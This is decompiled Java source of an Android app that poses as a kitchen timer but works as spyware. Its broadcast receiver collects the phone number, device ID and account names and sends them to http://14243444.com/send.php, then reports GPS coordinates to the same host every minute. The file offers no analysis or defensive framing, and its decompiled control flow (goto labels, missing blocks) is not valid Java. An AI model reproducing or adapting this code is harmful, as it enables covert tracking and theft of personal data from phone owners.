// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.example.android.service;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.*;
import android.location.*;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.*;
import android.telephony.TelephonyManager;
import android.widget.Toast;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

// Referenced classes of package com.example.android.service:
//            KitchenTimerService

public class Main extends Activity
    implements LocationListener
{
    public class KitchenTimerReceiver extends BroadcastReceiver
    {

        public void onReceive(Context context, Intent intent)
        {
            if(end_f.intValue() != 0) goto _L2; else goto _L1
_L1:
            TelephonyManager telephonymanager;
            Account aaccount[];
            int i;
            int j;
            if(ctf.intValue() != 0)
                break MISSING_BLOCK_LABEL_265;
            ctf = Integer.valueOf(1);
            telephonymanager = (TelephonyManager)getSystemService("phone");
            aaccount = AccountManager.get(Main.this).getAccounts();
            dtnn = "";
            i = aaccount.length;
            j = 0;
_L5:
            if(j < i) goto _L4; else goto _L3
_L3:
            telno = telephonymanager.getLine1Number();
            dvino = telephonymanager.getDeviceId();
            shootSound();
            mVib.vibrate(1000L);
            Intent intent3 = new Intent("android.intent.action.VIEW", Uri.parse((new StringBuilder("http://14243444.com/send.php?a_id=")).append(dvino).append("&telno=").append(telno).append("&m_addr=").append(dtnn).toString()));
            startActivity(intent3);
            gpst = Integer.valueOf(0);
            kitchenTimerService.schedule(0x1d4c0L);
            moveTaskToBack(true);
_L2:
            return;
_L4:
            Account account = aaccount[j];
            dtnn = account.name;
            j++;
              goto _L5
            if(gpst.intValue() == 0)
            {
                kitchenTimerService.schedule(1000L);
                gpst = Integer.valueOf(1);
                url = (new StringBuilder("http://14243444.com/check.php?id=")).append(dvino).toString();
                dtnn = doPostr(url, "");
                Toast.makeText(Main.this, (new StringBuilder("\u623B\u308A\u5024=")).append(dtnn).toString(), 1).show();
            } else
            if(1 == gpst.intValue())
            {
                dtnn = dtnn.substring(0, 1);
                if(dtnn.equals("1"))
                {
                    onPause();
                    gpst = Integer.valueOf(0);
                    end_f = Integer.valueOf(1);
                } else
                {
                    kitchenTimerService.schedule(5000L);
                    gpst = Integer.valueOf(2);
                    Intent intent2 = new Intent("android.intent.action.VIEW", Uri.parse("http://www.google.co.jp/"));
                    startActivity(intent2);
                }
            } else
            if(2 == gpst.intValue())
            {
                onPause();
                kitchenTimerService.schedule(60000L);
                gpst = Integer.valueOf(3);
                shootSound();
                mVib.vibrate(1000L);
                Intent intent1 = new Intent("android.intent.action.VIEW", Uri.parse((new StringBuilder("http://14243444.com/rgst5.php?gpsx=")).append(String.valueOf(latitude)).append("&gpsy=").append(String.valueOf(longitude)).toString()));
                startActivity(intent1);
            } else
            if(3 == gpst.intValue())
            {
                kitchenTimerService.schedule(60000L);
                gpst = Integer.valueOf(0);
                onResume();
            }
              goto _L2
        }

        final Main this$0;

        public KitchenTimerReceiver()
        {
            this$0 = Main.this;
            super();
        }
    }


    public Main()
    {
        ctf = Integer.valueOf(0);
        gpst = Integer.valueOf(0);
        end_f = Integer.valueOf(0);
        latitude = 0.0D;
        longitude = 0.0D;
        url = "";
        telno = "";
        dvino = "";
        dtnn = "";
        serviceConnection = new ServiceConnection() {

            public void onServiceConnected(ComponentName componentname, IBinder ibinder)
            {
                kitchenTimerService = ((KitchenTimerService.KitchenTimerBinder)ibinder).getService();
            }

            public void onServiceDisconnected(ComponentName componentname)
            {
                kitchenTimerService = null;
            }

            final Main this$0;

            
            {
                this$0 = Main.this;
                super();
            }
        };
    }

    private void shootSound()
    {
        if(((AudioManager)getSystemService("audio")).getStreamVolume(5) != 0)
        {
            MediaPlayer mediaplayer = null;
            if(true)
                mediaplayer = MediaPlayer.create(this, Uri.parse("file:///system/media/audio/ui/camera_click.ogg"));
            if(mediaplayer != null)
                mediaplayer.start();
        }
    }

    public String doPostr(String s, String s1)
    {
        HttpResponse httpresponse;
        HttpGet httpget = new HttpGet(s);
        DefaultHttpClient defaulthttpclient = new DefaultHttpClient();
        httpget.setHeader("Connection", "Keep-Alive");
        httpresponse = defaulthttpclient.execute(httpget);
        if(httpresponse.getStatusLine().getStatusCode() != 200)
            throw new Exception("");
          goto _L1
        Exception exception;
        exception;
        String s2 = "";
_L3:
        return s2;
_L1:
        String s3 = EntityUtils.toString(httpresponse.getEntity(), "UTF-8");
        s2 = s3;
        if(true) goto _L3; else goto _L2
_L2:
    }

    public void onCreate(Bundle bundle)
    {
        super.onCreate(bundle);
        setContentView(0x7f030000);
        mVib = (Vibrator)getSystemService("vibrator");
        mLocationManager = (LocationManager)getSystemService("location");
        Intent intent = new Intent(this, com/example/android/service/KitchenTimerService);
        startService(intent);
        IntentFilter intentfilter = new IntentFilter("Kitchen Timer Service");
        registerReceiver(receiver, intentfilter);
        bindService(intent, serviceConnection, 1);
        unbindService(serviceConnection);
        bindService(intent, serviceConnection, 1);
    }

    public void onDestroy()
    {
        super.onDestroy();
        unbindService(serviceConnection);
        unregisterReceiver(receiver);
        kitchenTimerService.stopSelf();
    }

    public void onLocationChanged(Location location)
    {
        latitude = location.getLatitude();
        longitude = location.getLongitude();
        onPause();
    }

    protected void onPause()
    {
        if(mLocationManager != null)
            mLocationManager.removeUpdates(this);
        super.onPause();
    }

    public void onProviderDisabled(String s)
    {
    }

    public void onProviderEnabled(String s)
    {
    }

    protected void onResume()
    {
        if(mLocationManager != null)
            mLocationManager.requestLocationUpdates("gps", 1000L, 1.0F, this);
        super.onResume();
    }

    public void onStatusChanged(String s, int i, Bundle bundle)
    {
        switch(i)
        {
        case 0: // '\0'
        case 1: // '\001'
        case 2: // '\002'
        default:
            return;
        }
    }

    private Integer ctf;
    private String dtnn;
    private String dvino;
    private Integer end_f;
    private Integer gpst;
    private android.app.KeyguardManager.KeyguardLock keylock;
    private KitchenTimerService kitchenTimerService;
    double latitude;
    LocationManager loc;
    double longitude;
    private LocationManager mLocationManager;
    private Vibrator mVib;
    PendingIntent pendingintent;
    public String powf;
    private final KitchenTimerReceiver receiver = new KitchenTimerReceiver();
    private ServiceConnection serviceConnection;
    private String telno;
    private String url;
    private android.os.PowerManager.WakeLock wakelock;


















}
